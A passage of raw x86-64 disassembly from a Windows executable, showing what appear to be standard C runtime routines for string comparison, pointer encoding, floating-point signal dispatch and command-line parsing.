   1400057d6:	eb 04                	jmp    0x1400057dc
   1400057d8:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   1400057dc:	48 85 db             	test   %rbx,%rbx
   1400057df:	74 03                	je     0x1400057e4
   1400057e1:	48 89 13             	mov    %rdx,(%rbx)
   1400057e4:	48 8b c2             	mov    %rdx,%rax
   1400057e7:	48 83 c4 20          	add    $0x20,%rsp
   1400057eb:	5b                   	pop    %rbx
   1400057ec:	c3                   	ret
   1400057ed:	cc                   	int3
   1400057ee:	cc                   	int3
   1400057ef:	cc                   	int3
   1400057f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400057f5:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400057fa:	57                   	push   %rdi
   1400057fb:	48 83 ec 20          	sub    $0x20,%rsp
   1400057ff:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   140005803:	48 8b f9             	mov    %rcx,%rdi
   140005806:	48 8d 71 08          	lea    0x8(%rcx),%rsi
   14000580a:	48 85 d2             	test   %rdx,%rdx
   14000580d:	74 05                	je     0x140005814
   14000580f:	0f 10 02             	movups (%rdx),%xmm0
   140005812:	eb 10                	jmp    0x140005824
   140005814:	83 3d 21 5b 01 00 00 	cmpl   $0x0,0x15b21(%rip)        # 0x14001b33c
   14000581b:	75 0d                	jne    0x14000582a
   14000581d:	0f 10 05 94 49 01 00 	movups 0x14994(%rip),%xmm0        # 0x14001a1b8
   140005824:	f3 0f 7f 06          	movdqu %xmm0,(%rsi)
   140005828:	eb 4e                	jmp    0x140005878
   14000582a:	e8 35 19 00 00       	call   0x140007164
   14000582f:	48 89 07             	mov    %rax,(%rdi)
   140005832:	48 8b d6             	mov    %rsi,%rdx
   140005835:	48 8b 88 90 00 00 00 	mov    0x90(%rax),%rcx
   14000583c:	48 89 0e             	mov    %rcx,(%rsi)
   14000583f:	48 8b 88 88 00 00 00 	mov    0x88(%rax),%rcx
   140005846:	48 89 4f 10          	mov    %rcx,0x10(%rdi)
   14000584a:	48 8b c8             	mov    %rax,%rcx
   14000584d:	e8 a6 24 00 00       	call   0x140007cf8
   140005852:	48 8b 0f             	mov    (%rdi),%rcx
   140005855:	48 8d 57 10          	lea    0x10(%rdi),%rdx
   140005859:	e8 ce 24 00 00       	call   0x140007d2c
   14000585e:	48 8b 0f             	mov    (%rdi),%rcx
   140005861:	8b 81 a8 03 00 00    	mov    0x3a8(%rcx),%eax
   140005867:	a8 02                	test   $0x2,%al
   140005869:	75 0d                	jne    0x140005878
   14000586b:	83 c8 02             	or     $0x2,%eax
   14000586e:	89 81 a8 03 00 00    	mov    %eax,0x3a8(%rcx)
   140005874:	c6 47 18 01          	movb   $0x1,0x18(%rdi)
   140005878:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000587d:	48 8b c7             	mov    %rdi,%rax
   140005880:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140005885:	48 83 c4 20          	add    $0x20,%rsp
   140005889:	5f                   	pop    %rdi
   14000588a:	c3                   	ret
   14000588b:	cc                   	int3
   14000588c:	4c 8b da             	mov    %rdx,%r11
   14000588f:	4c 8b d1             	mov    %rcx,%r10
   140005892:	4d 85 c0             	test   %r8,%r8
   140005895:	75 03                	jne    0x14000589a
   140005897:	33 c0                	xor    %eax,%eax
   140005899:	c3                   	ret
   14000589a:	41 0f b7 0a          	movzwl (%r10),%ecx
   14000589e:	4d 8d 52 02          	lea    0x2(%r10),%r10
   1400058a2:	41 0f b7 13          	movzwl (%r11),%edx
   1400058a6:	4d 8d 5b 02          	lea    0x2(%r11),%r11
   1400058aa:	8d 41 bf             	lea    -0x41(%rcx),%eax
   1400058ad:	83 f8 19             	cmp    $0x19,%eax
   1400058b0:	44 8d 49 20          	lea    0x20(%rcx),%r9d
   1400058b4:	8d 42 bf             	lea    -0x41(%rdx),%eax
   1400058b7:	44 0f 47 c9          	cmova  %ecx,%r9d
   1400058bb:	83 f8 19             	cmp    $0x19,%eax
   1400058be:	8d 4a 20             	lea    0x20(%rdx),%ecx
   1400058c1:	41 8b c1             	mov    %r9d,%eax
   1400058c4:	0f 47 ca             	cmova  %edx,%ecx
   1400058c7:	2b c1                	sub    %ecx,%eax
   1400058c9:	75 0b                	jne    0x1400058d6
   1400058cb:	45 85 c9             	test   %r9d,%r9d
   1400058ce:	74 06                	je     0x1400058d6
   1400058d0:	49 83 e8 01          	sub    $0x1,%r8
   1400058d4:	75 c4                	jne    0x14000589a
   1400058d6:	c3                   	ret
   1400058d7:	cc                   	int3
   1400058d8:	48 89 0d 01 59 01 00 	mov    %rcx,0x15901(%rip)        # 0x14001b1e0
   1400058df:	c3                   	ret
   1400058e0:	40 53                	rex push %rbx
   1400058e2:	48 83 ec 20          	sub    $0x20,%rsp
   1400058e6:	48 8b d9             	mov    %rcx,%rbx
   1400058e9:	e8 22 00 00 00       	call   0x140005910
   1400058ee:	48 85 c0             	test   %rax,%rax
   1400058f1:	74 14                	je     0x140005907
   1400058f3:	48 8b cb             	mov    %rbx,%rcx
   1400058f6:	ff 15 5c 9b 00 00    	call   *0x9b5c(%rip)        # 0x14000f458
   1400058fc:	85 c0                	test   %eax,%eax
   1400058fe:	74 07                	je     0x140005907
   140005900:	b8 01 00 00 00       	mov    $0x1,%eax
   140005905:	eb 02                	jmp    0x140005909
   140005907:	33 c0                	xor    %eax,%eax
   140005909:	48 83 c4 20          	add    $0x20,%rsp
   14000590d:	5b                   	pop    %rbx
   14000590e:	c3                   	ret
   14000590f:	cc                   	int3
   140005910:	40 53                	rex push %rbx
   140005912:	48 83 ec 20          	sub    $0x20,%rsp
   140005916:	33 c9                	xor    %ecx,%ecx
   140005918:	e8 bb 24 00 00       	call   0x140007dd8
   14000591d:	90                   	nop
   14000591e:	48 8b 1d db 46 01 00 	mov    0x146db(%rip),%rbx        # 0x14001a000
   140005925:	8b cb                	mov    %ebx,%ecx
   140005927:	83 e1 3f             	and    $0x3f,%ecx
   14000592a:	48 33 1d af 58 01 00 	xor    0x158af(%rip),%rbx        # 0x14001b1e0
   140005931:	48 d3 cb             	ror    %cl,%rbx
   140005934:	33 c9                	xor    %ecx,%ecx
   140005936:	e8 f1 24 00 00       	call   0x140007e2c
   14000593b:	48 8b c3             	mov    %rbx,%rax
   14000593e:	48 83 c4 20          	add    $0x20,%rsp
   140005942:	5b                   	pop    %rbx
   140005943:	c3                   	ret
   140005944:	e9 ff 24 00 00       	jmp    0x140007e48
   140005949:	cc                   	int3
   14000594a:	cc                   	int3
   14000594b:	cc                   	int3
   14000594c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005951:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140005956:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000595b:	57                   	push   %rdi
   14000595c:	48 83 ec 20          	sub    $0x20,%rsp
   140005960:	48 8b f2             	mov    %rdx,%rsi
   140005963:	8b f9                	mov    %ecx,%edi
   140005965:	e8 76 19 00 00       	call   0x1400072e0
   14000596a:	45 33 c9             	xor    %r9d,%r9d
   14000596d:	48 8b d8             	mov    %rax,%rbx
   140005970:	48 85 c0             	test   %rax,%rax
   140005973:	0f 84 3e 01 00 00    	je     0x140005ab7
   140005979:	48 8b 08             	mov    (%rax),%rcx
   14000597c:	48 8b c1             	mov    %rcx,%rax
   14000597f:	4c 8d 81 c0 00 00 00 	lea    0xc0(%rcx),%r8
   140005986:	49 3b c8             	cmp    %r8,%rcx
   140005989:	74 0d                	je     0x140005998
   14000598b:	39 38                	cmp    %edi,(%rax)
   14000598d:	74 0c                	je     0x14000599b
   14000598f:	48 83 c0 10          	add    $0x10,%rax
   140005993:	49 3b c0             	cmp    %r8,%rax
   140005996:	75 f3                	jne    0x14000598b
   140005998:	49 8b c1             	mov    %r9,%rax
   14000599b:	48 85 c0             	test   %rax,%rax
   14000599e:	0f 84 13 01 00 00    	je     0x140005ab7
   1400059a4:	4c 8b 40 08          	mov    0x8(%rax),%r8
   1400059a8:	4d 85 c0             	test   %r8,%r8
   1400059ab:	0f 84 06 01 00 00    	je     0x140005ab7
   1400059b1:	49 83 f8 05          	cmp    $0x5,%r8
   1400059b5:	75 0d                	jne    0x1400059c4
   1400059b7:	4c 89 48 08          	mov    %r9,0x8(%rax)
   1400059bb:	41 8d 40 fc          	lea    -0x4(%r8),%eax
   1400059bf:	e9 f5 00 00 00       	jmp    0x140005ab9
   1400059c4:	49 83 f8 01          	cmp    $0x1,%r8
   1400059c8:	75 08                	jne    0x1400059d2
   1400059ca:	83 c8 ff             	or     $0xffffffff,%eax
   1400059cd:	e9 e7 00 00 00       	jmp    0x140005ab9
   1400059d2:	48 8b 6b 08          	mov    0x8(%rbx),%rbp
   1400059d6:	48 89 73 08          	mov    %rsi,0x8(%rbx)
   1400059da:	83 78 04 08          	cmpl   $0x8,0x4(%rax)
   1400059de:	0f 85 ba 00 00 00    	jne    0x140005a9e
   1400059e4:	48 83 c1 30          	add    $0x30,%rcx
   1400059e8:	48 8d 91 90 00 00 00 	lea    0x90(%rcx),%rdx
   1400059ef:	eb 08                	jmp    0x1400059f9
   1400059f1:	4c 89 49 08          	mov    %r9,0x8(%rcx)
   1400059f5:	48 83 c1 10          	add    $0x10,%rcx
   1400059f9:	48 3b ca             	cmp    %rdx,%rcx
   1400059fc:	75 f3                	jne    0x1400059f1
   1400059fe:	81 38 8d 00 00 c0    	cmpl   $0xc000008d,(%rax)
   140005a04:	8b 7b 10             	mov    0x10(%rbx),%edi
   140005a07:	74 7a                	je     0x140005a83
   140005a09:	81 38 8e 00 00 c0    	cmpl   $0xc000008e,(%rax)
   140005a0f:	74 6b                	je     0x140005a7c
   140005a11:	81 38 8f 00 00 c0    	cmpl   $0xc000008f,(%rax)
   140005a17:	74 5c                	je     0x140005a75
   140005a19:	81 38 90 00 00 c0    	cmpl   $0xc0000090,(%rax)
   140005a1f:	74 4d                	je     0x140005a6e
   140005a21:	81 38 91 00 00 c0    	cmpl   $0xc0000091,(%rax)
   140005a27:	74 3e                	je     0x140005a67
   140005a29:	81 38 92 00 00 c0    	cmpl   $0xc0000092,(%rax)
   140005a2f:	74 2f                	je     0x140005a60
   140005a31:	81 38 93 00 00 c0    	cmpl   $0xc0000093,(%rax)
   140005a37:	74 20                	je     0x140005a59
   140005a39:	81 38 b4 02 00 c0    	cmpl   $0xc00002b4,(%rax)
   140005a3f:	74 11                	je     0x140005a52
   140005a41:	81 38 b5 02 00 c0    	cmpl   $0xc00002b5,(%rax)
   140005a47:	8b d7                	mov    %edi,%edx
   140005a49:	75 40                	jne    0x140005a8b
   140005a4b:	ba 8d 00 00 00       	mov    $0x8d,%edx
   140005a50:	eb 36                	jmp    0x140005a88
   140005a52:	ba 8e 00 00 00       	mov    $0x8e,%edx
   140005a57:	eb 2f                	jmp    0x140005a88
   140005a59:	ba 85 00 00 00       	mov    $0x85,%edx
   140005a5e:	eb 28                	jmp    0x140005a88
   140005a60:	ba 8a 00 00 00       	mov    $0x8a,%edx
   140005a65:	eb 21                	jmp    0x140005a88
   140005a67:	ba 84 00 00 00       	mov    $0x84,%edx
   140005a6c:	eb 1a                	jmp    0x140005a88
   140005a6e:	ba 81 00 00 00       	mov    $0x81,%edx
   140005a73:	eb 13                	jmp    0x140005a88
   140005a75:	ba 86 00 00 00       	mov    $0x86,%edx
   140005a7a:	eb 0c                	jmp    0x140005a88
   140005a7c:	ba 83 00 00 00       	mov    $0x83,%edx
   140005a81:	eb 05                	jmp    0x140005a88
   140005a83:	ba 82 00 00 00       	mov    $0x82,%edx
   140005a88:	89 53 10             	mov    %edx,0x10(%rbx)
   140005a8b:	b9 08 00 00 00       	mov    $0x8,%ecx
   140005a90:	49 8b c0             	mov    %r8,%rax
   140005a93:	ff 15 bf 99 00 00    	call   *0x99bf(%rip)        # 0x14000f458
   140005a99:	89 7b 10             	mov    %edi,0x10(%rbx)
   140005a9c:	eb 10                	jmp    0x140005aae
   140005a9e:	8b 48 04             	mov    0x4(%rax),%ecx
   140005aa1:	4c 89 48 08          	mov    %r9,0x8(%rax)
   140005aa5:	49 8b c0             	mov    %r8,%rax
   140005aa8:	ff 15 aa 99 00 00    	call   *0x99aa(%rip)        # 0x14000f458
   140005aae:	48 89 6b 08          	mov    %rbp,0x8(%rbx)
   140005ab2:	e9 13 ff ff ff       	jmp    0x1400059ca
   140005ab7:	33 c0                	xor    %eax,%eax
   140005ab9:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140005abe:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140005ac3:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140005ac8:	48 83 c4 20          	add    $0x20,%rsp
   140005acc:	5f                   	pop    %rdi
   140005acd:	c3                   	ret
   140005ace:	cc                   	int3
   140005acf:	cc                   	int3
   140005ad0:	8b 05 12 57 01 00    	mov    0x15712(%rip),%eax        # 0x14001b1e8
   140005ad6:	c3                   	ret
   140005ad7:	cc                   	int3
   140005ad8:	89 0d 0a 57 01 00    	mov    %ecx,0x1570a(%rip)        # 0x14001b1e8
   140005ade:	c3                   	ret
   140005adf:	cc                   	int3
   140005ae0:	48 8b 15 19 45 01 00 	mov    0x14519(%rip),%rdx        # 0x14001a000
   140005ae7:	8b ca                	mov    %edx,%ecx
   140005ae9:	48 33 15 00 57 01 00 	xor    0x15700(%rip),%rdx        # 0x14001b1f0
   140005af0:	83 e1 3f             	and    $0x3f,%ecx
   140005af3:	48 d3 ca             	ror    %cl,%rdx
   140005af6:	48 85 d2             	test   %rdx,%rdx
   140005af9:	0f 95 c0             	setne  %al
   140005afc:	c3                   	ret
   140005afd:	cc                   	int3
   140005afe:	cc                   	int3
   140005aff:	cc                   	int3
   140005b00:	48 89 0d e9 56 01 00 	mov    %rcx,0x156e9(%rip)        # 0x14001b1f0
   140005b07:	c3                   	ret
   140005b08:	48 8b 15 f1 44 01 00 	mov    0x144f1(%rip),%rdx        # 0x14001a000
   140005b0f:	4c 8b c1             	mov    %rcx,%r8
   140005b12:	8b ca                	mov    %edx,%ecx
   140005b14:	48 33 15 d5 56 01 00 	xor    0x156d5(%rip),%rdx        # 0x14001b1f0
   140005b1b:	83 e1 3f             	and    $0x3f,%ecx
   140005b1e:	48 d3 ca             	ror    %cl,%rdx
   140005b21:	48 85 d2             	test   %rdx,%rdx
   140005b24:	75 03                	jne    0x140005b29
   140005b26:	33 c0                	xor    %eax,%eax
   140005b28:	c3                   	ret
   140005b29:	49 8b c8             	mov    %r8,%rcx
   140005b2c:	48 8b c2             	mov    %rdx,%rax
   140005b2f:	48 ff 25 22 99 00 00 	rex.W jmp *0x9922(%rip)        # 0x14000f458
   140005b36:	cc                   	int3
   140005b37:	cc                   	int3
   140005b38:	4c 8b 05 c1 44 01 00 	mov    0x144c1(%rip),%r8        # 0x14001a000
   140005b3f:	4c 8b c9             	mov    %rcx,%r9
   140005b42:	41 8b d0             	mov    %r8d,%edx
   140005b45:	b9 40 00 00 00       	mov    $0x40,%ecx
   140005b4a:	83 e2 3f             	and    $0x3f,%edx
   140005b4d:	2b ca                	sub    %edx,%ecx
   140005b4f:	49 d3 c9             	ror    %cl,%r9
   140005b52:	4d 33 c8             	xor    %r8,%r9
   140005b55:	4c 89 0d 94 56 01 00 	mov    %r9,0x15694(%rip)        # 0x14001b1f0
   140005b5c:	c3                   	ret
   140005b5d:	cc                   	int3
   140005b5e:	cc                   	int3
   140005b5f:	cc                   	int3
   140005b60:	48 8b c4             	mov    %rsp,%rax
   140005b63:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140005b67:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140005b6b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140005b6f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140005b73:	41 54                	push   %r12
   140005b75:	41 56                	push   %r14
   140005b77:	41 57                	push   %r15
   140005b79:	48 83 ec 20          	sub    $0x20,%rsp
   140005b7d:	4c 8b 7c 24 60       	mov    0x60(%rsp),%r15
   140005b82:	4d 8b e1             	mov    %r9,%r12
   140005b85:	49 8b d8             	mov    %r8,%rbx
   140005b88:	4c 8b f2             	mov    %rdx,%r14
   140005b8b:	48 8b f9             	mov    %rcx,%rdi
   140005b8e:	49 83 27 00          	andq   $0x0,(%r15)
   140005b92:	49 c7 01 01 00 00 00 	movq   $0x1,(%r9)
   140005b99:	48 85 d2             	test   %rdx,%rdx
   140005b9c:	74 07                	je     0x140005ba5
   140005b9e:	48 89 1a             	mov    %rbx,(%rdx)
   140005ba1:	49 83 c6 08          	add    $0x8,%r14
   140005ba5:	40 32 ed             	xor    %bpl,%bpl
   140005ba8:	80 3f 22             	cmpb   $0x22,(%rdi)
   140005bab:	75 0f                	jne    0x140005bbc
   140005bad:	40 84 ed             	test   %bpl,%bpl
   140005bb0:	40 b6 22             	mov    $0x22,%sil
   140005bb3:	40 0f 94 c5          	sete   %bpl
   140005bb7:	48 ff c7             	inc    %rdi
   140005bba:	eb 37                	jmp    0x140005bf3
   140005bbc:	49 ff 07             	incq   (%r15)
   140005bbf:	48 85 db             	test   %rbx,%rbx
   140005bc2:	74 07                	je     0x140005bcb
   140005bc4:	8a 07                	mov    (%rdi),%al
   140005bc6:	88 03                	mov    %al,(%rbx)
   140005bc8:	48 ff c3             	inc    %rbx
   140005bcb:	0f be 37             	movsbl (%rdi),%esi
   140005bce:	48 ff c7             	inc    %rdi
   140005bd1:	8b ce                	mov    %esi,%ecx
   140005bd3:	e8 58 3a 00 00       	call   0x140009630
   140005bd8:	85 c0                	test   %eax,%eax
   140005bda:	74 12                	je     0x140005bee
   140005bdc:	49 ff 07             	incq   (%r15)
   140005bdf:	48 85 db             	test   %rbx,%rbx
   140005be2:	74 07                	je     0x140005beb
   140005be4:	8a 07                	mov    (%rdi),%al
   140005be6:	88 03                	mov    %al,(%rbx)
   140005be8:	48 ff c3             	inc    %rbx
   140005beb:	48 ff c7             	inc    %rdi
   140005bee:	40 84 f6             	test   %sil,%sil
   140005bf1:	74 1c                	je     0x140005c0f
   140005bf3:	40 84 ed             	test   %bpl,%bpl
   140005bf6:	75 b0                	jne    0x140005ba8
   140005bf8:	40 80 fe 20          	cmp    $0x20,%sil
   140005bfc:	74 06                	je     0x140005c04
   140005bfe:	40 80 fe 09          	cmp    $0x9,%sil
   140005c02:	75 a4                	jne    0x140005ba8
   140005c04:	48 85 db             	test   %rbx,%rbx
   140005c07:	74 09                	je     0x140005c12
   140005c09:	c6 43 ff 00          	movb   $0x0,-0x1(%rbx)
   140005c0d:	eb 03                	jmp    0x140005c12
   140005c0f:	48 ff cf             	dec    %rdi
   140005c12:	40 32 f6             	xor    %sil,%sil
   140005c15:	8a 07                	mov    (%rdi),%al
   140005c17:	84 c0                	test   %al,%al
   140005c19:	0f 84 d4 00 00 00    	je     0x140005cf3
   140005c1f:	3c 20                	cmp    $0x20,%al
   140005c21:	74 04                	je     0x140005c27
   140005c23:	3c 09                	cmp    $0x9,%al
   140005c25:	75 07                	jne    0x140005c2e
   140005c27:	48 ff c7             	inc    %rdi
   140005c2a:	8a 07                	mov    (%rdi),%al
   140005c2c:	eb f1                	jmp    0x140005c1f
   140005c2e:	84 c0                	test   %al,%al
   140005c30:	0f 84 bd 00 00 00    	je     0x140005cf3
   140005c36:	4d 85 f6             	test   %r14,%r14
   140005c39:	74 07                	je     0x140005c42
   140005c3b:	49 89 1e             	mov    %rbx,(%r14)
   140005c3e:	49 83 c6 08          	add    $0x8,%r14
   140005c42:	49 ff 04 24          	incq   (%r12)
   140005c46:	ba 01 00 00 00       	mov    $0x1,%edx
   140005c4b:	33 c0                	xor    %eax,%eax
   140005c4d:	eb 05                	jmp    0x140005c54
   140005c4f:	48 ff c7             	inc    %rdi
   140005c52:	ff c0                	inc    %eax
   140005c54:	8a 0f                	mov    (%rdi),%cl
   140005c56:	80 f9 5c             	cmp    $0x5c,%cl
   140005c59:	74 f4                	je     0x140005c4f
   140005c5b:	80 f9 22             	cmp    $0x22,%cl
   140005c5e:	75 30                	jne    0x140005c90
   140005c60:	84 c2                	test   %al,%dl
   140005c62:	75 18                	jne    0x140005c7c
   140005c64:	40 84 f6             	test   %sil,%sil
   140005c67:	74 0a                	je     0x140005c73
   140005c69:	38 4f 01             	cmp    %cl,0x1(%rdi)
   140005c6c:	75 05                	jne    0x140005c73
   140005c6e:	48 ff c7             	inc    %rdi
   140005c71:	eb 09                	jmp    0x140005c7c
   140005c73:	33 d2                	xor    %edx,%edx
   140005c75:	40 84 f6             	test   %sil,%sil
   140005c78:	40 0f 94 c6          	sete   %sil
   140005c7c:	d1 e8                	shr    $1,%eax
   140005c7e:	eb 10                	jmp    0x140005c90
   140005c80:	ff c8                	dec    %eax
   140005c82:	48 85 db             	test   %rbx,%rbx
   140005c85:	74 06                	je     0x140005c8d
   140005c87:	c6 03 5c             	movb   $0x5c,(%rbx)
   140005c8a:	48 ff c3             	inc    %rbx
   140005c8d:	49 ff 07             	incq   (%r15)
   140005c90:	85 c0                	test   %eax,%eax
   140005c92:	75 ec                	jne    0x140005c80
   140005c94:	8a 07                	mov    (%rdi),%al
   140005c96:	84 c0                	test   %al,%al
   140005c98:	74 46                	je     0x140005ce0
   140005c9a:	40 84 f6             	test   %sil,%sil
   140005c9d:	75 08                	jne    0x140005ca7
   140005c9f:	3c 20                	cmp    $0x20,%al
   140005ca1:	74 3d                	je     0x140005ce0
   140005ca3:	3c 09                	cmp    $0x9,%al
   140005ca5:	74 39                	je     0x140005ce0
   140005ca7:	85 d2                	test   %edx,%edx
   140005ca9:	74 2d                	je     0x140005cd8
   140005cab:	48 85 db             	test   %rbx,%rbx
   140005cae:	74 07                	je     0x140005cb7
   140005cb0:	88 03                	mov    %al,(%rbx)
   140005cb2:	48 ff c3             	inc    %rbx
   140005cb5:	8a 07                	mov    (%rdi),%al
   140005cb7:	0f be c8             	movsbl %al,%ecx
   140005cba:	e8 71 39 00 00       	call   0x140009630
   140005cbf:	85 c0                	test   %eax,%eax
   140005cc1:	74 12                	je     0x140005cd5
   140005cc3:	49 ff 07             	incq   (%r15)
   140005cc6:	48 ff c7             	inc    %rdi
   140005cc9:	48 85 db             	test   %rbx,%rbx
   140005ccc:	74 07                	je     0x140005cd5
   140005cce:	8a 07                	mov    (%rdi),%al
   140005cd0:	88 03                	mov    %al,(%rbx)
   140005cd2:	48 ff c3             	inc    %rbx
   140005cd5:	49 ff 07             	incq   (%r15)
   140005cd8:	48 ff c7             	inc    %rdi
   140005cdb:	e9 66 ff ff ff       	jmp    0x140005c46
   140005ce0:	48 85 db             	test   %rbx,%rbx
   140005ce3:	74 06                	je     0x140005ceb
   140005ce5:	c6 03 00             	movb   $0x0,(%rbx)
   140005ce8:	48 ff c3             	inc    %rbx
   140005ceb:	49 ff 07             	incq   (%r15)
   140005cee:	e9 22 ff ff ff       	jmp    0x140005c15
   140005cf3:	4d 85 f6             	test   %r14,%r14
   140005cf6:	74 04                	je     0x140005cfc
   140005cf8:	49 83 26 00          	andq   $0x0,(%r14)
   140005cfc:	49 ff 04 24          	incq   (%r12)
   140005d00:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140005d05:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140005d0a:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140005d0f:	48 8b 7c 24 58       	mov    0x58(%rsp),%rdi
   140005d14:	48 83 c4 20          	add    $0x20,%rsp
   140005d18:	41 5f                	pop    %r15
   140005d1a:	41 5e                	pop    %r14
   140005d1c:	41 5c                	pop    %r12
   140005d1e:	c3                   	ret
   140005d1f:	cc                   	int3
   140005d20:	40 53                	rex push %rbx
   140005d22:	48 83 ec 20          	sub    $0x20,%rsp
   140005d26:	48 b8 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rax
   140005d2d:	ff ff 1f 
   140005d30:	4c 8b ca             	mov    %rdx,%r9
   140005d33:	48 3b c8             	cmp    %rax,%rcx
   140005d36:	73 3d                	jae    0x140005d75
   140005d38:	33 d2                	xor    %edx,%edx
   140005d3a:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140005d3e:	49 f7 f0             	div    %r8
   140005d41:	4c 3b c8             	cmp    %rax,%r9
   140005d44:	73 2f                	jae    0x140005d75
   140005d46:	48 c1 e1 03          	shl    $0x3,%rcx
   140005d4a:	4d 0f af c8          	imul   %r8,%r9
   140005d4e:	48 8b c1             	mov    %rcx,%rax
   140005d51:	48 f7 d0             	not    %rax
   140005d54:	49 3b c1             	cmp    %r9,%rax
   140005d57:	76 1c                	jbe    0x140005d75
   140005d59:	49 03 c9             	add    %r9,%rcx
   140005d5c:	ba 01 00 00 00       	mov    $0x1,%edx
   140005d61:	e8 42 21 00 00       	call   0x140007ea8
   140005d66:	33 c9                	xor    %ecx,%ecx
   140005d68:	48 8b d8             	mov    %rax,%rbx
   140005d6b:	e8 b0 21 00 00       	call   0x140007f20
   140005d70:	48 8b c3             	mov    %rbx,%rax
   140005d73:	eb 02                	jmp    0x140005d77
   140005d75:	33 c0                	xor    %eax,%eax
   140005d77:	48 83 c4 20          	add    $0x20,%rsp
   140005d7b:	5b                   	pop    %rbx
   140005d7c:	c3                   	ret
   140005d7d:	cc                   	int3
   140005d7e:	cc                   	int3
   140005d7f:	cc                   	int3
   140005d80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005d85:	55                   	push   %rbp
   140005d86:	56                   	push   %rsi
   140005d87:	57                   	push   %rdi
   140005d88:	41 56                	push   %r14
   140005d8a:	41 57                	push   %r15
   140005d8c:	48 8b ec             	mov    %rsp,%rbp
   140005d8f:	48 83 ec 30          	sub    $0x30,%rsp
   140005d93:	33 ff                	xor    %edi,%edi
   140005d95:	44 8b f1             	mov    %ecx,%r14d
   140005d98:	85 c9                	test   %ecx,%ecx
   140005d9a:	0f 84 53 01 00 00    	je     0x140005ef3
   140005da0:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140005da3:	83 f8 01             	cmp    $0x1,%eax
   140005da6:	76 16                	jbe    0x140005dbe
   140005da8:	e8 93 19 00 00       	call   0x140007740
   140005dad:	8d 5f 16             	lea    0x16(%rdi),%ebx
   140005db0:	89 18                	mov    %ebx,(%rax)
   140005db2:	e8 69 18 00 00       	call   0x140007620
   140005db7:	8b fb                	mov    %ebx,%edi
   140005db9:	e9 35 01 00 00       	jmp    0x140005ef3
   140005dbe:	e8 bd 34 00 00       	call   0x140009280
   140005dc3:	48 8d 1d 36 54 01 00 	lea    0x15436(%rip),%rbx        # 0x14001b200
   140005dca:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140005dd0:	48 8b d3             	mov    %rbx,%rdx
   140005dd3:	33 c9                	xor    %ecx,%ecx
   140005dd5:	e8 5e 2c 00 00       	call   0x140008a38
   140005dda:	48 8b 35 d7 59 01 00 	mov    0x159d7(%rip),%rsi        # 0x14001b7b8
   140005de1:	48 89 1d b0 59 01 00 	mov    %rbx,0x159b0(%rip)        # 0x14001b798
   140005de8:	48 85 f6             	test   %rsi,%rsi
   140005deb:	74 05                	je     0x140005df2
   140005ded:	40 38 3e             	cmp    %dil,(%rsi)
   140005df0:	75 03                	jne    0x140005df5
   140005df2:	48 8b f3             	mov    %rbx,%rsi
   140005df5:	48 8d 45 48          	lea    0x48(%rbp),%rax
   140005df9:	48 89 7d 40          	mov    %rdi,0x40(%rbp)
   140005dfd:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   140005e01:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005e06:	45 33 c0             	xor    %r8d,%r8d
   140005e09:	48 89 7d 48          	mov    %rdi,0x48(%rbp)
   140005e0d:	33 d2                	xor    %edx,%edx
   140005e0f:	48 8b ce             	mov    %rsi,%rcx
   140005e12:	e8 49 fd ff ff       	call   0x140005b60
   140005e17:	4c 8b 7d 40          	mov    0x40(%rbp),%r15
   140005e1b:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140005e21:	48 8b 55 48          	mov    0x48(%rbp),%rdx
   140005e25:	49 8b cf             	mov    %r15,%rcx
   140005e28:	e8 f3 fe ff ff       	call   0x140005d20
   140005e2d:	48 8b d8             	mov    %rax,%rbx
   140005e30:	48 85 c0             	test   %rax,%rax
   140005e33:	75 18                	jne    0x140005e4d
   140005e35:	e8 06 19 00 00       	call   0x140007740
   140005e3a:	bb 0c 00 00 00       	mov    $0xc,%ebx
   140005e3f:	33 c9                	xor    %ecx,%ecx
   140005e41:	89 18                	mov    %ebx,(%rax)
   140005e43:	e8 d8 20 00 00       	call   0x140007f20
   140005e48:	e9 6a ff ff ff       	jmp    0x140005db7
   140005e4d:	4e 8d 04 f8          	lea    (%rax,%r15,8),%r8
   140005e51:	48 8b d3             	mov    %rbx,%rdx
   140005e54:	48 8d 45 48          	lea    0x48(%rbp),%rax
   140005e58:	48 8b ce             	mov    %rsi,%rcx
   140005e5b:	4c 8d 4d 40          	lea    0x40(%rbp),%r9
   140005e5f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005e64:	e8 f7 fc ff ff       	call   0x140005b60
   140005e69:	41 83 fe 01          	cmp    $0x1,%r14d
   140005e6d:	75 16                	jne    0x140005e85
   140005e6f:	8b 45 40             	mov    0x40(%rbp),%eax
   140005e72:	ff c8                	dec    %eax
   140005e74:	48 89 1d 2d 59 01 00 	mov    %rbx,0x1592d(%rip)        # 0x14001b7a8
   140005e7b:	89 05 1f 59 01 00    	mov    %eax,0x1591f(%rip)        # 0x14001b7a0
   140005e81:	33 c9                	xor    %ecx,%ecx
   140005e83:	eb 69                	jmp    0x140005eee
   140005e85:	48 8d 55 38          	lea    0x38(%rbp),%rdx
